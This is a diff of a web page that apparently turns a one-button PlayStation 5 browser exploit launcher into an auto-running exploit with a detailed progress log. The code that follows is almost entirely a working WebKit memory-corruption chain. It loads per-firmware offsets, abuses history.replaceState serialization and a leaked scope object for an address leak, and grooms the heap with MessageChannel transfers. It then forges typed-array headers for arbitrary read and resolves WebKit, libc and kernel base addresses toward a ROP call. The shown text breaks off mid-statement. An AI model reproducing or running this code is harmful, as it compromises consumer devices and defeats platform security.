@@ -2,57 +2,81 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5</title>
+<title>PS5 log</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{
-    user-select:none; -webkit-user-select:none;
-    background-color:#0c0c0f; color:#fff; font-family:Arial;
-    display:flex; flex-direction:column; align-items:center; justify-content:center;
-    height:100vh; margin:0; padding:0; overflow:hidden; box-sizing:border-box;
-}
-#cat{ width:240px; max-width:66vw; border-radius:10px; margin-bottom:26px;
-      box-shadow:0 0 0 2px #2a2a2e, 0 0 20px 4px #2a2a2e; }
-.btn{
-    padding:1rem 2rem; text-align:center; cursor:pointer;
-    min-width:12rem; border-radius:1.25rem; background-color:#202125;
-    border:none; color:#fff; font-size:1.5rem; font-weight:800;
-    transition:background-color 0.25s ease;
-}
-.btn:hover{ background-color:#a2a2a6; color:#202020; }
-.btn.disabled{ opacity:0.4; pointer-events:none; }
-#msg{ color:#888; font-size:0.8rem; margin-top:14px; min-height:1em; }
+    html, body {
+        margin: 0;
+        padding: 0;
+        background: #ffffff;
+        color: #000000;
+        font-family: "Consolas", "Courier New", monospace;
+        font-size: 13px;
+        line-height: 1.45;
+    }
+    body {
+        padding: 14px 16px 40px 16px;
+        white-space: pre-wrap;
+        word-break: break-word;
+    }
+    #log {
+        white-space: pre-wrap;
+        word-break: break-word;
+    }
+    .dim  { color: #666666; }
+    .ok   { color: #006600; }
+    .warn { color: #a05a00; }
+    .err  { color: #aa0000; }
+    .head { font-weight: bold; }
 </style>
 </head>
 <body>
-<img id="cat" src="cat.jpg" alt="">
-<a tabindex="0" class="btn disabled" id="run">Run Exploit</a>
-<div id="msg"></div>
+<div id="log"></div>
 
 <script>
 "use strict";
+
+/* ============================================================
+   Logging
+   ============================================================ */
+const logEl = document.getElementById("log");
+const lines = [];
+
+function emit(text, cls) {
+    const span = cls ? `<span class="${cls}">${text}</span>` : text;
+    lines.push(span);
+    logEl.innerHTML = lines.join("\n") + "\n";
+    window.scrollTo(0, document.body.scrollHeight);
+}
+
+function hex(v) {
+    return "0x" + v.toString(16);
+}
+
+/* ============================================================
+   Configuration (mirrors the launcher)
+   ============================================================ */
 const EXPLOIT_URL = "notify.html";
 const OFFSETS_URL = "offsets/offsets.json";
 
-const run = document.getElementById("run");
-const msg = document.getElementById("msg");
+const Q = new URLSearchParams(location.search);
 
-const m = /PlayStation 5\/(\d+)\.(\d+)/.exec(navigator.userAgent);
-const fw = m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : null;
-
-let entry = null;
+/* ============================================================
+   Firmware / offset loading
+   ============================================================ */
+const uaMatch = /PlayStation 5\/(\d+)\.(\d+)/.exec(navigator.userAgent);
+const FW_LABEL = uaMatch
+    ? `${uaMatch[1].padStart(2, "0")}.${uaMatch[2].padStart(2, "0")}`
+    : (Q.get("fw") || "??.??");
 
 function fwNum(s) {
     const p = s.split(".");
     return parseInt(p[0], 10) * 100 + parseInt(p[1], 10);
 }
 
-// Nearest known firmware within the SAME major. Offsets are usually stable
-// across a major; if the build shifted, the kernel-base cross-check fails safe
-// (it simply won't fire rather than crashing).
 function nearest(data, target) {
     const want = fwNum(target);
-    const maj = target.split(".")[0];
+    const maj  = target.split(".")[0];
     let best = null, bestd = 1e9;
     for (const k in data) {
         if (k.split(".")[0] !== maj) continue;
@@ -62,44 +86,1176 @@ function nearest(data, target) {
     return best;
 }
 
+/* ============================================================
+   Exploit constants
+   ============================================================ */
+const REVISION = "renderer-notify-auto-proof-2";
+const K = 2;
+const DUPLICATE_INDEX = 2;
+const CONTROL_INDEX = 0xffff;
+const CONTROL_INT = -64000;
+const FILLER_BIGINTS = K - 1;
+const FILLER_OBJECTS = 0xfffe - K;
+const EXPECTED_LENGTH = 0x50001;
+const CELL_BYTES = 0x30;
+const FUNCTION_BYTES = 0x20;
+const NATIVE_EXECUTABLE_BYTES = 0x38;
+const HOLDER_BYTES = 0x40;
+const ARENA_VIEW_BYTES = 0x30;
+const COLLATOR_BYTES = 0x38;
+const BOUND_COMPARE_BYTES = 0x20;
+const PARSEINT_NATIVE_OFFSET = 0x1ea18;
+const WEBKIT_TEXT_SIZE = 0x2c7c000;
+
+const IMPORT_WINDOW_A_OFFSET = 0x34f5708;
+const IMPORT_WINDOW_A_BYTES = 0xd0;
+const IMPORT_WINDOW_B_OFFSET = 0x34f5860;
+const IMPORT_WINDOW_B_BYTES = 0x38;
+
+const NATURAL_TRAMPOLINE_OFFSET = 0x1d11a;
+const NOTIFY_OFFSET = 0x4740;
+const NOTIFICATION_REQUEST_SIZE = 0xc30;
+const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
+
+const ARENA_BYTES = 0x1000;
+const FAKE_UCOLLATOR_OFFSET = 0x100;
+const FAKE_VTABLE_OFFSET = 0x300;
+
+const CARRIER_SLOTS = 9000000;
+const CARRIER_BYTES = CARRIER_SLOTS * 8;
+const CAPTURE_DELAY_MS = 50;
+const COMPOSE_DELAY_MS = 100;
+const symbolToString = Symbol.prototype.toString;
+
+const DRAIN_SIZE = 0x10000;
+const SLAB_SIZE = 0x400000;
+const BUTTERFLY_HOLE_SIZE = 0x81000;
+const SEPARATOR_SIZE = 0x10000;
+const EARLY_HOLE_SIZE = 0x70000;
+const GUARD_SIZE = 0x90000;
+const PREDECESSOR_SIZE = 0x80000;
+const FINAL_HOLE_SIZE = 0x80000;
+const DRAIN_COUNT = 512;
+
+let P_HOST_CTOR_LIST = [0x1e0d8, 0x1e320, 0x1f368];
+let P_NOTIFY = 0x4740;
+let P_GADGET = 0x1d11a;
+let P_GETPID_SLOT = 0x34f57b8;
+let P_GETPID_EXP = 0x1b280;
+let P_CLOSE_SLOT = 0x34f57a8;
+let P_CLOSE_EXP = 0x26e70;
+let P_ERROR_SLOT = 0x34f57b0;
+let P_ERROR_EXP = 0xf340;
+let HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
+
+/* ============================================================
+   Buffers / scratch
+   ============================================================ */
+const rwHeader = new Uint8Array(CELL_BYTES);
+const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+const holderHeader = new Uint8Array(HOLDER_BYTES);
+const arenaViewHeader = new Uint8Array(ARENA_VIEW_BYTES);
+const collatorHeader = new Uint8Array(COLLATOR_BYTES);
+const compareFnHeader = new Uint8Array(BOUND_COMPARE_BYTES);
+const collatorOriginal = new Uint8Array(COLLATOR_BYTES - 0x18);
+const scratchBits = new ArrayBuffer(8);
+const scratchBytes = new Uint8Array(scratchBits);
+const scratchWords = new Uint32Array(scratchBits);
+const scratchDouble = new Float64Array(scratchBits);
+
+/* ============================================================
+   State
+   ============================================================ */
+let referenceTarget = null;
+let rwBuffer = null, rwView = null, rwMirror = null;
+let targetBuffer = null, targetView = null;
+let nativeTarget = parseInt;
+let fakeHost = null, lengthWord = null;
+let arenaBuffer = null, arenaView = null;
+let realCollator = null, compareFn = null;
+let targetHolder = null, holderGuardA = null, holderGuardB = null;
+let fillerGraph = null, outerGraph = null;
+
+let leakedScope = null, getterCarrier = null, preparedSymbolObject = null;
+let capturedString = null, capturedWords = null, copiedLength = 0;
+let captureState = 0, captureError = null;
+let hostAddress = NaN, fakeAddress = NaN;
+let predecessorWords = null;
+let pointerLow = 0, pointerHigh = 0;
+
+let targetAddress = NaN;
+let nativeTargetAddress = NaN;
+let arenaViewAddress = NaN;
+let realCollatorAddress = NaN;
+let compareFnAddress = NaN;
+
+let rwOriginalVector = NaN;
+let rwHeaderOK = false;
+let functionHeaderOK = false;
+let nativeExecutableHeaderOK = false;
+let functionStructureID = 0;
+let nativeExecutableStructureID = 0;
+let executableAddress = NaN;
+let nativeFunctionAddress = NaN;
+let nativeConstructorAddress = NaN;
+let webkitBase = NaN;
+let webkitBaseOK = false;
+let pointersRepeated = false;
+let restoreObserved = false;
+
+let getpidPointer = 0, closePointer = 0, errorPointer = 0;
+let getpidStatus = 0, closeStatus = 0, errorStatus = 0;
+let gotReadAttempted = false;
+let gotWindowAddressesOK = false;
+let gotWindowsRepeated = false;
+let gotCanonicalOK = false;
+let gotReadOK = false;
+
+let kernelBase = NaN, kernelResolvedCount = 0, kernelBaseOK = false;
+let libcBase = NaN, libcBaseOK = false;
+let requirementsBase = NaN, requirementsBaseOK = false;
+
+let holderHeaderOK = false;
+let arenaViewHeaderOK = false;
+let collatorHeaderOK = false;
+let compareFnHeaderOK = false;
+let arenaBacking = NaN;
+let arenaBackingRepeated = false;
+let fakeUCollatorAddress = NaN;
+let fakeVtableAddress = NaN;
+let naturalTrampolineAddress = NaN;
+let notifyEntryAddress = NaN;
+let notifyAddressOK = false;
+let arenaLayoutOK = false;
+let arenaFilledOK = false;
+let carrierArmedForCommit = false;
+let notifyReady = false;
+
+let compositionState = 0;
+let compositionLength = 0;
+let compositionError = null;
+
+let entry = null;
+let started = false;
+
+/* ============================================================
+   Helpers
+   ============================================================ */
+function allZero(bytes, start, end) {
+    for (let i = start; i < end; ++i) if (bytes[i] !== 0) return false;
+    return true;
+}
+
+function uint32At(bytes, off) {
+    return bytes[off] + bytes[off+1]*0x100 + bytes[off+2]*0x10000 + bytes[off+3]*0x1000000;
+}
+
+function low48At(bytes, off) {
+    return bytes[off] + bytes[off+1]*0x100 + bytes[off+2]*0x10000 +
+           bytes[off+3]*0x1000000 + bytes[off+4]*0x100000000 +
+           bytes[off+5]*0x10000000000;
+}
+
+function plausibleCell(v) {
+    return v > 0x100000000 && v <= 0xffffffffffff &&
+           v <= 9007199254740991 && Math.floor(v) === v && v % 8 === 0;
+}
+
+function plausibleAddress(v) {
+    return v > 0x100000000 && v <= 0xffffffffffff &&
+           v <= 9007199254740991 && Math.floor(v) === v;
+}
+
+function canonicalLow48(bytes, off) {
+    return bytes[off + 6] === 0 && bytes[off + 7] === 0;
+}
+
+function inPS5UserModuleBand(v) {
+    return v >= 0x800000000 && v < 0x900000000;
+}
+
+function dumpHex(bytes, count) {
+    let out = "";
+    for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
+    return out;
+}
+
+function putLow48(bytes, off, value) {
+    const high = Math.floor(value / 0x100000000);
+    const low = value - high * 0x100000000;
+    bytes[off]   = low & 0xff;
+    bytes[off+1] = Math.floor(low / 0x100) & 0xff;
+    bytes[off+2] = Math.floor(low / 0x10000) & 0xff;
+    bytes[off+3] = Math.floor(low / 0x1000000) & 0xff;
+    bytes[off+4] = high & 0xff;
+    bytes[off+5] = Math.floor(high / 0x100) & 0xff;
+    bytes[off+6] = 0;
+    bytes[off+7] = 0;
+}
+
+function readBytes(dst, src, n) { for (let i = 0; i < n; ++i) dst[i] = src[i]; }
+function sameBytes(a, b, n) {
+    for (let i = 0; i < n; ++i) if (a[i] !== b[i]) return false;
+    return true;
+}
+function readTwiceMatches(dst, src, n) {
+    readBytes(dst, src, n);
+    return sameBytes(dst, src, n);
+}
+
+function aimCarrier(candidate, address) {
+    const high = Math.floor(address / 0x100000000);
+    scratchWords[0] = address - high * 0x100000000;
+    scratchWords[1] = high;
+    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
+}
+
+function restoreCarrier(candidate) {
+    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
+}
+
+function pointerFromWords(words, off) {
+    if (words[off + 3] !== 0) return NaN;
+    return words[off] + words[off+1]*0x10000 + words[off+2]*0x100000000;
+}
+
+function encodedHeaderNumber() {
+    const raw = new ArrayBuffer(8);
+    const u32 = new Uint32Array(raw);
+    const f64 = new Float64Array(raw);
+    u32[0] = 0x00004250;
+    u32[1] = 0x01062800;
+    return f64[0];
+}
+
+/* ============================================================
+   Boot logging
+   ============================================================ */
+emit("PS5 notify-chain log", "head");
+emit("");
+emit("user-agent : " + navigator.userAgent, "dim");
+emit("revision   : " + REVISION, "dim");
+emit("fw label   : " + FW_LABEL, "dim");
+emit("k          : " + K + "  duplicate-index=" + DUPLICATE_INDEX, "dim");
+emit("drain      : " + DRAIN_COUNT + " x " + hex(DRAIN_SIZE), "dim");
+emit("payload    : " + EXPLOIT_URL, "dim");
+emit("offsets    : " + OFFSETS_URL, "dim");
+emit("");
+
+/* ============================================================
+   Load offsets, then run
+   ============================================================ */
+emit("[launcher] fetching offsets...");
 fetch(OFFSETS_URL, { cache: "no-store" })
     .then(function (r) { return r.json(); })
     .then(function (data) {
-        if (!fw) { msg.textContent = "not a PS5 browser"; return; }
-        entry = data[fw];
-        if (entry) {
-            run.classList.remove("disabled");
+        emit("[launcher] offsets table received (" + Object.keys(data).length + " entries)");
+
+        if (!uaMatch && !Q.get("fw")) {
+            emit("[launcher] not a PS5 browser, aborting", "err");
             return;
         }
-        const near = nearest(data, fw);
-        if (near) {
-            entry = data[near];
-            msg.textContent = `${fw}: no exact offsets, trying ${near} (unverified)`;
-            run.classList.remove("disabled");
+
+        entry = data[FW_LABEL];
+        if (entry) {
+            emit("[launcher] exact offset set for " + FW_LABEL, "ok");
         } else {
-            msg.textContent = `firmware ${fw} not supported`;
+            const near = nearest(data, FW_LABEL);
+            if (near) {
+                entry = data[near];
+                emit("[launcher] no exact set for " + FW_LABEL +
+                     ", using nearest in major: " + near, "warn");
+            } else {
+                emit("[launcher] firmware " + FW_LABEL + " not supported", "err");
+                return;
+            }
         }
+
+        /* Apply offsets */
+        P_HOST_CTOR_LIST = entry.hc;
+        HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
+        P_GADGET          = parseInt(entry.gd, 16);
+        P_NOTIFY          = parseInt(entry.nt, 16);
+        P_GETPID_SLOT     = parseInt(entry.gps, 16);
+        P_GETPID_EXP      = parseInt(entry.gpe, 16);
+        P_CLOSE_SLOT      = parseInt(entry.cls, 16);
+        P_CLOSE_EXP       = parseInt(entry.cle, 16);
+        P_ERROR_SLOT      = parseInt(entry.ers, 16);
+        P_ERROR_EXP       = parseInt(entry.ere, 16);
+
+        emit("");
+        emit("[offsets] hc      = " + P_HOST_CTOR_LIST.map(hex).join(", "), "dim");
+        emit("[offsets] gd      = " + hex(P_GADGET), "dim");
+        emit("[offsets] notify  = " + hex(P_NOTIFY), "dim");
+        emit("[offsets] gps/gpe = " + hex(P_GETPID_SLOT) + " / " + hex(P_GETPID_EXP), "dim");
+        emit("[offsets] cls/cle = " + hex(P_CLOSE_SLOT) + " / " + hex(P_CLOSE_EXP), "dim");
+        emit("[offsets] ers/ere = " + hex(P_ERROR_SLOT) + " / " + hex(P_ERROR_EXP), "dim");
+        emit("");
+
+        if (typeof BigInt !== "function" || typeof MessageChannel !== "function" ||
+            typeof Symbol !== "function" || typeof history === "undefined" ||
+            typeof history.replaceState !== "function") {
+            emit("[fatal] unsupported browser primitives", "err");
+            return;
+        }
+
+        setTimeout(startAttempt, 10);
     })
-    .catch(function () {
-        msg.textContent = "failed to load offsets";
+    .catch(function (e) {
+        emit("[launcher] failed to load offsets: " + e.message, "err");
     });
 
-run.addEventListener("click", function () {
-    if (!entry) return;
-    const q = new URLSearchParams();
-    q.set("go", "1");
-    q.set("fw", fw);
-    q.set("hc", entry.hc.join(","));
-    q.set("gd", entry.gd);
-    q.set("notify", entry.nt);
-    q.set("gps", entry.gps);
-    q.set("gpe", entry.gpe);
-    q.set("cls", entry.cls);
-    q.set("cle", entry.cle);
-    q.set("ers", entry.ers);
-    q.set("ere", entry.ere);
-    location.href = `${EXPLOIT_URL}?${q.toString()}`;
-});
+/* ============================================================
+   Attempt
+   ============================================================ */
+function startAttempt() {
+    if (started) return;
+    started = true;
+
+    emit("[attempt] begin " + REVISION);
+
+    try {
+        buildAndStoreGraph();
+    } catch (e) {
+        emit("[attempt] setup threw: " + e.name + ": " + e.message, "err");
+        return;
+    }
+
+    prepareAddrof();
+}
+
+/* ============================================================
+   Graph / fake host
+   ============================================================ */
+function buildFakeHost() {
+    emit("[fake-host] allocating rw buffer 0x100");
+
+    rwBuffer = new ArrayBuffer(0x100);
+    rwView = new Uint8Array(rwBuffer);
+    rwMirror = new Uint8Array(rwBuffer);
+    rwMirror[0] = 0x3c;
+
+    targetBuffer = new ArrayBuffer(0x20);
+    targetView = new Uint8Array(targetBuffer);
+    targetView[0] = 0xa5;
+    lengthWord = { keep: 0x51515151 };
+
+    fakeHost = {
+        q0: encodedHeaderNumber(),
+        q1: 1.1,
+        q2: rwView,
+        q3: lengthWord,
+        q4: 2.2,
+        q5: 3.3
+    };
+
+    delete fakeHost.q1;
+    delete fakeHost.q4;
+    delete fakeHost.q5;
+
+    emit("[fake-host] q0=" + hex(uint32At(
+        new Uint8Array(Float64Array.of(fakeHost.q0).buffer), 0)) +
+        " q2=rwView q3=lengthWord");
+    emit("[fake-host] rwMirror[0]=" + hex(rwMirror[0]) +
+        " targetView[0]=" + hex(targetView[0]));
+
+    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView ||
+        fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c ||
+        targetView[0] !== 0xa5 || typeof nativeTarget !== "function") {
+        throw new Error("fake-host-shape-failed");
+    }
+
+    emit("[arena] allocating 0x1000 backing + Intl.Collator");
+    arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+    arenaView = new Uint8Array(arenaBuffer);
+    arenaView[0xf00] = 0x52;
+    arenaView[0xf01] = 0x4f;
+    arenaView[0xf02] = 0x50;
+    arenaView[0xf03] = 0x31;
+
+    realCollator = new Intl.Collator("en", { usage: "search" });
+    compareFn = realCollator.compare;
+    emit("[arena] sentinel = \"ROP1\" at +0xf00");
+    emit("[collator] prewarm: compareFn(\"a\",\"b\")=" +
+        (compareFn("a","b") < 0 ? "<0 ok" : "fail"));
+
+    if (!(compareFn("a", "b") < 0)) throw new Error("collator-prewarm-failed");
+
+    holderGuardA = { marker: 0x484f4c44 };
+    holderGuardB = { marker: 0x47554152 };
+    targetHolder = {
+        q0: nativeTarget,
+        q1: arenaView,
+        q2: realCollator,
+        q3: compareFn,
+        q4: holderGuardA,
+        q5: holderGuardB
+    };
+
+    emit("[holder] targetHolder = parseInt, arenaView, collator, compareFn, guards");
+}
+
+function buildAndStoreGraph() {
+    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+    buildFakeHost();
+
+    emit("[ssv] building filler graph: " + FILLER_BIGINTS + " bigints + " +
+        FILLER_OBJECTS + " objects");
+
+    fillerGraph = new Array(0xfffd);
+    let pos = 0;
+    const huge = 1n << 40n;
+    for (let b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
+    for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+
+    outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph[0] = fillerGraph;
+    outerGraph[1] = referenceTarget;
+    outerGraph[2] = referenceTarget;
+    outerGraph[CONTROL_INDEX] = CONTROL_INT;
+
+    emit("[ssv] outerGraph length = " + outerGraph.length +
+        " (expected " + (CONTROL_INDEX + 1) + ")");
+    emit("[ssv] duplicate-index=" + DUPLICATE_INDEX +
+        " both entries point at the same referenceTarget");
+
+    emit("[ssv] calling history.replaceState with attacker graph...");
+    history.replaceState(outerGraph, "");
+    emit("[ssv] replaceState returned; serialization accepted", "ok");
+}
+
+/* ============================================================
+   Addrof via Symbol.toString on leaked scope
+   ============================================================ */
+function leakScopeObject() {
+    class Leaker { leak() { return super.foo; } }
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get: function (target, property, receiver) { return receiver; }
+    });
+    const leak = Leaker.prototype.leak;
+    return (function () { return leak(); })();
+}
+
+function prepareSymbolWrapper(F) {
+    leakedScope = leakScopeObject();
+    if (leakedScope === undefined || leakedScope === null)
+        throw new Error("scope-not-leaked");
+
+    for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
+    for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+
+    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+    return Object(leakedScope.g);
+}
+
+function prepareAddrof() {
+    capturedWords = new Uint16Array(16);
+    getterCarrier = function getterCarrierFunction() { return 7; };
+
+    emit("[addrof] carrier function with " + CARRIER_SLOTS +
+        " slots (" + (CARRIER_BYTES / 1024 / 1024) + " MiB backing)");
+
+    getterCarrier[0] = fakeHost;
+    for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+    getterCarrier[1] = targetHolder;
+    getterCarrier[2] = fakeHost;
+    getterCarrier[3] = targetHolder;
+
+    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+    emit("[addrof] symbol wrapper prepared, waiting " + CAPTURE_DELAY_MS + "ms");
+
+    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+    setTimeout(beginComposition, COMPOSE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+    try {
+        capturedString = symbolToString.call(preparedSymbolObject);
+        copiedLength = capturedString.length;
+        for (let i = 0; i < 16; i++)
+            capturedWords[i] = capturedString.charCodeAt(7 + i);
+        captureState = 1;
+        emit("[addrof] symbol.toString produced " + copiedLength + " chars");
+    } catch (error) {
+        captureError = error;
+        captureState = -1;
+        emit("[addrof] threw: " + error.name + ": " + error.message, "err");
+    }
+}
+
+/* ============================================================
+   Heap grooming + arbitrary read via history.state
+   ============================================================ */
+function fillRawCellPointers(backing, pointer) {
+    pointerHigh = Math.floor(pointer / 0x100000000);
+    pointerLow = pointer - pointerHigh * 0x100000000;
+
+    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff ||
+        Math.floor(pointerLow) !== pointerLow ||
+        pointerLow < 0 || pointerLow > 0xffffffff)
+        throw new Error("invalid-low48-fake-address");
+
+    predecessorWords = new Uint32Array(backing);
+    for (let i = 0; i < predecessorWords.length; i += 2) {
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i + 1] = pointerHigh;
+    }
+}
+
+function clearPredecessor() {
+    if (predecessorWords !== null) predecessorWords.fill(0);
+}
+
+function runGroomAndLoad() {
+    emit("[groom] draining " + DRAIN_COUNT + " x " + hex(DRAIN_SIZE));
+    const keep = new Array(DRAIN_COUNT);
+    for (let i = 0; i < DRAIN_COUNT; ++i) keep[i] = new ArrayBuffer(DRAIN_SIZE);
+
+    const channel = new MessageChannel();
+    channel.port1.close();
+    channel.port2.close();
+
+    emit("[groom] posting slab " + hex(SLAB_SIZE) + " to closed port");
+    let slab = new ArrayBuffer(SLAB_SIZE);
+    channel.port1.postMessage(0, [slab]);
+    slab = null;
+
+    const butterflyHole1 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
+    const butterflyHole2 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
+    const separator     = new ArrayBuffer(SEPARATOR_SIZE);
+    const earlyHole     = new ArrayBuffer(EARLY_HOLE_SIZE);
+    const guard         = new ArrayBuffer(GUARD_SIZE);
+    const predecessor   = new ArrayBuffer(PREDECESSOR_SIZE);
+    const finalHole     = new ArrayBuffer(FINAL_HOLE_SIZE);
+
+    emit("[groom] carving holes: butterfly=" + hex(BUTTERFLY_HOLE_SIZE) +
+        " sep=" + hex(SEPARATOR_SIZE) +
+        " early=" + hex(EARLY_HOLE_SIZE) +
+        " guard=" + hex(GUARD_SIZE) +
+        " pred=" + hex(PREDECESSOR_SIZE) +
+        " final=" + hex(FINAL_HOLE_SIZE));
+
+    fillRawCellPointers(predecessor, fakeAddress);
+    emit("[groom] predecessor filled with fake address " + hex(fakeAddress) +
+        " (" + (PREDECESSOR_SIZE / 8) + " qwords)");
+
+    emit("[groom] freeing holes via postMessage transfer");
+    channel.port1.postMessage(0,
+        [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
+
+    loadHistoryCritical();
+}
+
+/* ============================================================
+   Core: read history.state, hijack butterfly
+   ============================================================ */
+function loadHistoryCritical() {
+    let result = null;
+    let candidate = null;
+    let rwHeaderCaptured = false;
+    let rwVectorTouched = false;
+
+    try {
+        emit("[read] loading history.state...");
+        result = history.state;
+        compositionLength = result.length;
+        emit("[read] history.state.length = " + compositionLength +
+            " (expected " + EXPECTED_LENGTH + ")");
+
+        if (compositionLength !== EXPECTED_LENGTH) {
+            emit("[read] length mismatch, treating as a clean miss", "warn");
+            result[DUPLICATE_INDEX] = undefined;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        if (result[1] === result[DUPLICATE_INDEX]) {
+            emit("[read] duplicate entry was normalized (same reference)", "warn");
+            result[DUPLICATE_INDEX] = undefined;
+            clearPredecessor();
+            compositionState = 2;
+            return;
+        }
+
+        candidate = result[DUPLICATE_INDEX];
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+
+        emit("[read] captured a candidate cell at index " + DUPLICATE_INDEX);
+
+        readBytes(rwHeader, candidate, CELL_BYTES);
+        rwHeaderCaptured = true;
+
+        const rwSID = uint32At(rwHeader, 0);
+        const rwHeaderHigh = uint32At(rwHeader, 4);
+        const rwButterfly = low48At(rwHeader, 8);
+        rwOriginalVector = low48At(rwHeader, 0x10);
+
+        emit("[read] cell SID=" + hex(rwSID) +
+            " butterfly=" + hex(rwButterfly) +
+            " vector=" + hex(rwOriginalVector));
+
+        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000 &&
+            (rwSID & 0xf) === 0 &&
+            rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08 &&
+            (rwHeader[7] === 0 || rwHeader[7] === 1) &&
+            rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 &&
+            rwButterfly > 0x100000000 && rwButterfly % 8 === 0 &&
+            rwHeader[0x16] === 0 && rwHeader[0x17] === 0 &&
+            rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 &&
+            rwHeader[0x18] === 0 && rwHeader[0x19] === 1 &&
+            rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0 &&
+            rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0 &&
+            rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0 &&
+            rwOffsetZero && rwHeader[0x28] === 0x58;
+
+        emit("[read] rw cell header validation: " +
+            (rwHeaderOK ? "PASS" : "FAIL"), rwHeaderOK ? "ok" : "err");
+        emit("[read] rw-header-hex " + dumpHex(rwHeader, CELL_BYTES), "dim");
+
+        if (!rwHeaderOK) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        /* ---- upgrade rw cell SID from Uint8Array to ArrayBuffer view ---- */
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        const upgradedHeader = scratchDouble[0];
+        if (!(upgradedHeader === upgradedHeader &&
+              upgradedHeader !== Infinity && upgradedHeader !== -Infinity)) {
+            emit("[rw] upgraded header not finite, aborting", "err");
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        fakeHost.q0 = upgradedHeader;
+        emit("[rw] q0 upgraded, vector now controllable");
+
+        rwVectorTouched = true;
+
+        /* ---- read targetHolder from carrier table ---- */
+        aimCarrier(candidate, targetAddress);
+        emit("[carrier] aiming at targetAddress " + hex(targetAddress));
+
+        const holderRepeated = readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
+        const holderSID = uint32At(holderHeader, 0);
+        nativeTargetAddress = low48At(holderHeader, 0x10);
+        arenaViewAddress = low48At(holderHeader, 0x18);
+        realCollatorAddress = low48At(holderHeader, 0x20);
+        compareFnAddress = low48At(holderHeader, 0x28);
+        const holderGuardAAddress = low48At(holderHeader, 0x30);
+        const holderGuardBAddress = low48At(holderHeader, 0x38);
+
+        holderHeaderOK = holderRepeated &&
+            holderSID >= 0x4000 && holderSID < 0x08000000 &&
+            (holderSID & 0xf) === 0 &&
+            holderHeader[4] === 0 && holderHeader[5] === 0x18 && holderHeader[6] === 0 &&
+            (holderHeader[7] === 0 || holderHeader[7] === 1) &&
+            allZero(holderHeader, 0x08, 0x10) &&
+            plausibleCell(nativeTargetAddress) &&
+            plausibleCell(arenaViewAddress) &&
+            plausibleCell(realCollatorAddress) &&
+            plausibleCell(compareFnAddress) &&
+            plausibleCell(holderGuardAAddress) &&
+            plausibleCell(holderGuardBAddress);
+
+        emit("[holder] read-twice=" + holderRepeated +
+            " parseInt=" + hex(nativeTargetAddress) +
+            " arenaView=" + hex(arenaViewAddress) +
+            " collator=" + hex(realCollatorAddress) +
+            " compareFn=" + hex(compareFnAddress));
+
+        if (!holderHeaderOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        /* ---- read parseInt JSFunction ---- */
+        aimCarrier(candidate, nativeTargetAddress);
+        readBytes(targetHeader, rwView, FUNCTION_BYTES);
+
+        functionStructureID = uint32At(targetHeader, 0);
+        executableAddress = low48At(targetHeader, 0x18);
+
+        emit("[jsobj] parseInt SID=" + hex(functionStructureID) +
+            " executable=" + hex(executableAddress));
+
+        functionHeaderOK = functionStructureID >= 0x4000 &&
+            functionStructureID < 0x08000000 &&
+            (functionStructureID & 0xf) === 0 &&
+            targetHeader[4] === 0 && targetHeader[5] === 0x1a && targetHeader[6] === 0x0e;
+
+        if (!functionHeaderOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        /* ---- read native executable ---- */
+        aimCarrier(candidate, executableAddress);
+        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
+
+        nativeExecutableStructureID = uint32At(targetHeader, 0);
+        nativeFunctionAddress = low48At(targetHeader, 0x28);
+        nativeConstructorAddress = low48At(targetHeader, 0x30);
+
+        emit("[native-exec] SID=" + hex(nativeExecutableStructureID) +
